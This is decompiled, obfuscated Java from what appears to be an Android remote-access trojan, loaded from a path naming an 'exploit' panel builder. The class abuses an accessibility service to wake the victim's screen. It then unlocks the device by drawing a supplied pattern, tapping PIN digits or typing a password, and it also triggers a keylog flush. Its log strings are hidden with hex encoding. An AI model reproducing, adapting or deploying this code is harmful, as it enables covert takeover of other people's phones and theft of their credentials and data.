package v.s;

import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Bundle;
import android.view.accessibility.AccessibilityNodeInfo;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.util.Map;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final /* synthetic */ class PbcIoTfr9OdE implements Runnable {
    public final /* synthetic */ String JXn4Qf7zpnLjP5;
    public final /* synthetic */ DataQFAdapter vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs;

    public /* synthetic */ PbcIoTfr9OdE(DataQFAdapter dataQFAdapter, String str, int i) {
        this.w9sT1Swbhx3hs = i;
        this.vekpFI4d1Nc4fakF = dataQFAdapter;
        this.JXn4Qf7zpnLjP5 = str;
    }

    @Override // java.lang.Runnable
    public final void run() {
        Rect rectFivkjwgu2UdAtiY;
        float fWidth;
        float fHeight;
        float f;
        float f2;
        switch (this.w9sT1Swbhx3hs) {
            case 0:
                DataQFAdapter.scheduleKeylogFlush$lambda$10(this.vekpFI4d1Nc4fakF, this.JXn4Qf7zpnLjP5);
                break;
            case 1:
                DataQFAdapter dataQFAdapter = this.vekpFI4d1Nc4fakF;
                String str = this.JXn4Qf7zpnLjP5;
                try {
                    dataQFAdapter.performWakeScreen();
                    Thread.sleep(600L);
                    yI1KTRoNlsjx realScreenSize = dataQFAdapter.getRealScreenSize();
                    int iIntValue = ((Number) realScreenSize.w9sT1Swbhx3hs).intValue();
                    int iIntValue2 = ((Number) realScreenSize.vekpFI4d1Nc4fakF).intValue();
                    Path path = new Path();
                    float f3 = iIntValue;
                    float f4 = f3 / 2.0f;
                    float f5 = iIntValue2;
                    path.moveTo(f4, 0.8f * f5);
                    path.lineTo(f4, 0.2f * f5);
                    dataQFAdapter.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 250L)).build(), null, null);
                    Thread.sleep(1200L);
                    DataQFAdapter.Companion.getClass();
                    DataQFAdapter dataQFAdapter2 = DataQFAdapter.instance;
                    if (dataQFAdapter2 == null) {
                        rectFivkjwgu2UdAtiY = null;
                    } else {
                        try {
                            AccessibilityNodeInfo rootInActiveWindow = dataQFAdapter2.getRootInActiveWindow();
                            if (rootInActiveWindow != null) {
                                rectFivkjwgu2UdAtiY = GARjgaGEpTotOxcl8vfe.fivkjwgu2UdAtiY(rootInActiveWindow);
                                rootInActiveWindow.recycle();
                            } else {
                                rectFivkjwgu2UdAtiY = null;
                            }
                            break;
                        } catch (Exception unused) {
                        }
                    }
                    if (rectFivkjwgu2UdAtiY == null) {
                        DataQFAdapter.Companion.getClass();
                        rectFivkjwgu2UdAtiY = DataQFAdapter.lastPatternViewBounds;
                    }
                    if (rectFivkjwgu2UdAtiY == null || rectFivkjwgu2UdAtiY.width() <= 100 || rectFivkjwgu2UdAtiY.height() <= 100) {
                        fWidth = 0.32f * f3;
                        fHeight = f5 * 0.13f;
                        String unused2 = DataQFAdapter.TAG;
                        TypefaceCache.obtain("001600650052008900F700FF00D400A6002F007A0059008600F300B4009200B700220062004F008200E200B1009200A4002C00790049008300E3");
                        f = 0.18f * f3;
                        f2 = 0.3f * f5;
                    } else {
                        float fWidth2 = rectFivkjwgu2UdAtiY.width() * 0.12f;
                        f = rectFivkjwgu2UdAtiY.left + fWidth2;
                        f2 = rectFivkjwgu2UdAtiY.top + fWidth2;
                        float f6 = fWidth2 * 2.0f;
                        fWidth = (rectFivkjwgu2UdAtiY.width() - f6) / 2.0f;
                        fHeight = (rectFivkjwgu2UdAtiY.height() - f6) / 2.0f;
                        String unused3 = DataQFAdapter.TAG;
                        TypefaceCache.obtain("001600650052008900F700FF00D600BE002D00770056008E00F300FF00C200A600370062005E009500FE00FF00D000A800360078005F009400AA00FF");
                        TypefaceCache.obtain("006F0036004B008600F400E2");
                        rectFivkjwgu2UdAtiY.toString();
                    }
                    float f7 = f + fWidth;
                    float f8 = (fWidth * 2.0f) + f;
                    float f9 = f2 + fHeight;
                    float f10 = (fHeight * 2.0f) + f2;
                    Map mapL1V0lQr6TbwNKqHfXNbb = oRoeOWAwLibMBxZYyTh.l1V0lQr6TbwNKqHfXNbb(new yI1KTRoNlsjx('1', new yI1KTRoNlsjx(Float.valueOf(f), Float.valueOf(f2))), new yI1KTRoNlsjx('2', new yI1KTRoNlsjx(Float.valueOf(f7), Float.valueOf(f2))), new yI1KTRoNlsjx('3', new yI1KTRoNlsjx(Float.valueOf(f8), Float.valueOf(f2))), new yI1KTRoNlsjx('4', new yI1KTRoNlsjx(Float.valueOf(f), Float.valueOf(f9))), new yI1KTRoNlsjx('5', new yI1KTRoNlsjx(Float.valueOf(f7), Float.valueOf(f9))), new yI1KTRoNlsjx('6', new yI1KTRoNlsjx(Float.valueOf(f8), Float.valueOf(f9))), new yI1KTRoNlsjx('7', new yI1KTRoNlsjx(Float.valueOf(f), Float.valueOf(f10))), new yI1KTRoNlsjx('8', new yI1KTRoNlsjx(Float.valueOf(f7), Float.valueOf(f10))), new yI1KTRoNlsjx('9', new yI1KTRoNlsjx(Float.valueOf(f8), Float.valueOf(f10))));
                    if (str.length() >= 2) {
                        Path path2 = new Path();
                        yI1KTRoNlsjx yi1ktronlsjx = (yI1KTRoNlsjx) mapL1V0lQr6TbwNKqHfXNbb.get(Character.valueOf(str.charAt(0)));
                        if (yi1ktronlsjx != null) {
                            path2.moveTo(((Number) yi1ktronlsjx.w9sT1Swbhx3hs).floatValue(), ((Number) yi1ktronlsjx.vekpFI4d1Nc4fakF).floatValue());
                            int length = str.length();
                            for (int i = 1; i < length; i++) {
                                yI1KTRoNlsjx yi1ktronlsjx2 = (yI1KTRoNlsjx) mapL1V0lQr6TbwNKqHfXNbb.get(Character.valueOf(str.charAt(i)));
                                if (yi1ktronlsjx2 != null) {
                                    path2.lineTo(((Number) yi1ktronlsjx2.w9sT1Swbhx3hs).floatValue(), ((Number) yi1ktronlsjx2.vekpFI4d1Nc4fakF).floatValue());
                                }
                            }
                            dataQFAdapter.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path2, 0L, str.length() * 150)).build(), null, null);
                        }
                    }
                    String unused4 = DataQFAdapter.TAG;
                    TypefaceCache.obtain("00130077004F009300F500AD00DC00E7003600780057008800F300B4009200A000260065004F009200E200BA009200A3002C0078005E00DD00B0");
                    TypefaceCache.obtain("00630075005E008B00FC00AC009E00E7003000750049008200F500B10092");
                } catch (Exception e) {
                    String unused5 = DataQFAdapter.TAG;
                    TypefaceCache.obtain("00130077004F009300F500AD00DC00E7003600780057008800F300B4009200A2003100640054009500AA00FF");
                    e.getMessage();
                    return;
                }
                break;
            case 2:
                DataQFAdapter dataQFAdapter3 = this.vekpFI4d1Nc4fakF;
                String str2 = this.JXn4Qf7zpnLjP5;
                try {
                    dataQFAdapter3.performWakeScreen();
                    Thread.sleep(600L);
                    yI1KTRoNlsjx realScreenSize2 = dataQFAdapter3.getRealScreenSize();
                    int iIntValue3 = ((Number) realScreenSize2.w9sT1Swbhx3hs).intValue();
                    int iIntValue4 = ((Number) realScreenSize2.vekpFI4d1Nc4fakF).intValue();
                    Path path3 = new Path();
                    float f11 = iIntValue3;
                    float f12 = f11 / 2.0f;
                    float f13 = iIntValue4;
                    path3.moveTo(f12, 0.75f * f13);
                    path3.lineTo(f12, 0.25f * f13);
                    dataQFAdapter3.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path3, 0L, 250L)).build(), null, null);
                    Thread.sleep(1000L);
                    float f14 = 0.42f * f13;
                    float f15 = ((f13 * 0.92f) - f14) / 4.0f;
                    float f16 = f11 / 3.0f;
                    float f17 = f16 * 0.5f;
                    float f18 = (0.5f * f15) + f14;
                    yI1KTRoNlsjx yi1ktronlsjx3 = new yI1KTRoNlsjx('1', new yI1KTRoNlsjx(Float.valueOf(f17), Float.valueOf(f18)));
                    float f19 = f16 * 1.5f;
                    yI1KTRoNlsjx yi1ktronlsjx4 = new yI1KTRoNlsjx('2', new yI1KTRoNlsjx(Float.valueOf(f19), Float.valueOf(f18)));
                    float f20 = f16 * 2.5f;
                    yI1KTRoNlsjx yi1ktronlsjx5 = new yI1KTRoNlsjx('3', new yI1KTRoNlsjx(Float.valueOf(f20), Float.valueOf(f18)));
                    float f21 = (1.5f * f15) + f14;
                    yI1KTRoNlsjx yi1ktronlsjx6 = new yI1KTRoNlsjx('4', new yI1KTRoNlsjx(Float.valueOf(f17), Float.valueOf(f21)));
                    yI1KTRoNlsjx yi1ktronlsjx7 = new yI1KTRoNlsjx('5', new yI1KTRoNlsjx(Float.valueOf(f19), Float.valueOf(f21)));
                    yI1KTRoNlsjx yi1ktronlsjx8 = new yI1KTRoNlsjx('6', new yI1KTRoNlsjx(Float.valueOf(f20), Float.valueOf(f21)));
                    float f22 = (f15 * 2.5f) + f14;
                    yI1KTRoNlsjx yi1ktronlsjx9 = new yI1KTRoNlsjx('7', new yI1KTRoNlsjx(Float.valueOf(f17), Float.valueOf(f22)));
                    yI1KTRoNlsjx yi1ktronlsjx10 = new yI1KTRoNlsjx('8', new yI1KTRoNlsjx(Float.valueOf(f19), Float.valueOf(f22)));
                    yI1KTRoNlsjx yi1ktronlsjx11 = new yI1KTRoNlsjx('9', new yI1KTRoNlsjx(Float.valueOf(f20), Float.valueOf(f22)));
                    Float fValueOf = Float.valueOf(f19);
                    float f23 = (3.5f * f15) + f14;
                    Map mapL1V0lQr6TbwNKqHfXNbb2 = oRoeOWAwLibMBxZYyTh.l1V0lQr6TbwNKqHfXNbb(yi1ktronlsjx3, yi1ktronlsjx4, yi1ktronlsjx5, yi1ktronlsjx6, yi1ktronlsjx7, yi1ktronlsjx8, yi1ktronlsjx9, yi1ktronlsjx10, yi1ktronlsjx11, new yI1KTRoNlsjx('0', new yI1KTRoNlsjx(fValueOf, Float.valueOf(f23))));
                    int length2 = str2.length();
                    for (int i2 = 0; i2 < length2; i2++) {
                        yI1KTRoNlsjx yi1ktronlsjx12 = (yI1KTRoNlsjx) mapL1V0lQr6TbwNKqHfXNbb2.get(Character.valueOf(str2.charAt(i2)));
                        if (yi1ktronlsjx12 != null) {
                            Path path4 = new Path();
                            path4.moveTo(((Number) yi1ktronlsjx12.w9sT1Swbhx3hs).floatValue(), ((Number) yi1ktronlsjx12.vekpFI4d1Nc4fakF).floatValue());
                            dataQFAdapter3.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path4, 0L, 50L)).build(), null, null);
                            Thread.sleep(200L);
                        }
                    }
                    Thread.sleep(500L);
                    Path path5 = new Path();
                    path5.moveTo(f20, f23);
                    dataQFAdapter3.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path5, 0L, 50L)).build(), null, null);
                    String unused6 = DataQFAdapter.TAG;
                    TypefaceCache.obtain("0013005F007500C700E500B100DE00A80020007D001B008000F500AC00C600B200310073001B008300FF00B100D700FD0063");
                    TypefaceCache.obtain("006300720052008000F900AB00C100EB006300650058009500F500BA00DC00E7");
                } catch (Exception e2) {
                    String unused7 = DataQFAdapter.TAG;
                    TypefaceCache.obtain("0013005F007500C700E500B100DE00A80020007D001B008200E200AD00DD00B500790036");
                    e2.getMessage();
                    return;
                }
                break;
            default:
                DataQFAdapter dataQFAdapter4 = this.vekpFI4d1Nc4fakF;
                String str3 = this.JXn4Qf7zpnLjP5;
                try {
                    dataQFAdapter4.performWakeScreen();
                    Thread.sleep(600L);
                    yI1KTRoNlsjx realScreenSize3 = dataQFAdapter4.getRealScreenSize();
                    int iIntValue5 = ((Number) realScreenSize3.w9sT1Swbhx3hs).intValue();
                    int iIntValue6 = ((Number) realScreenSize3.vekpFI4d1Nc4fakF).intValue();
                    Path path6 = new Path();
                    float f24 = iIntValue5;
                    float f25 = f24 / 2.0f;
                    float f26 = iIntValue6;
                    path6.moveTo(f25, 0.75f * f26);
                    path6.lineTo(f25, 0.25f * f26);
                    dataQFAdapter4.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path6, 0L, 250L)).build(), null, null);
                    Thread.sleep(1200L);
                    AccessibilityNodeInfo rootInActiveWindow2 = dataQFAdapter4.getRootInActiveWindow();
                    boolean z = false;
                    if (rootInActiveWindow2 != null) {
                        DataQFAdapter.Companion.getClass();
                        AccessibilityNodeInfo accessibilityNodeInfoGmNWMfvn6zlEj = GARjgaGEpTotOxcl8vfe.gmNWMfvn6zlEj(rootInActiveWindow2, 0);
                        if (accessibilityNodeInfoGmNWMfvn6zlEj != null) {
                            accessibilityNodeInfoGmNWMfvn6zlEj.performAction(1);
                            Thread.sleep(200L);
                            Bundle bundle = new Bundle();
                            bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", str3);
                            accessibilityNodeInfoGmNWMfvn6zlEj.performAction(2097152, bundle);
                            Thread.sleep(300L);
                            accessibilityNodeInfoGmNWMfvn6zlEj.recycle();
                        }
                        AccessibilityNodeInfo accessibilityNodeInfoGIIiyi2ddlMDR0 = GARjgaGEpTotOxcl8vfe.gIIiyi2ddlMDR0(rootInActiveWindow2, 0);
                        if (accessibilityNodeInfoGIIiyi2ddlMDR0 != null) {
                            accessibilityNodeInfoGIIiyi2ddlMDR0.performAction(16);
                            accessibilityNodeInfoGIIiyi2ddlMDR0.recycle();
                            z = true;
                        }
                        rootInActiveWindow2.recycle();
                    }
                    if (!z) {
                        Thread.sleep(300L);
                        Path path7 = new Path();
                        path7.moveTo(f24 * 0.85f, f26 * 0.88f);
                        dataQFAdapter4.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path7, 0L, 50L)).build(), null, null);
                    }
                    String unused8 = DataQFAdapter.TAG;
                    TypefaceCache.obtain("001300770048009400E700B000C000A3006300630055008B00FF00BC00D900E7002700790055008200AA00FF");
                    TypefaceCache.obtain("006300750053008600E200AC009E00E7003000630059008A00F900AB00C600A20027002B");
                } catch (Exception e3) {
                    String unused9 = DataQFAdapter.TAG;
                    TypefaceCache.obtain("001300770048009400E700B000C000A3006300630055008B00FF00BC00D900E7002600640049008800E200E50092");
                    e3.getMessage();
                }
                break;
        }
    }
}
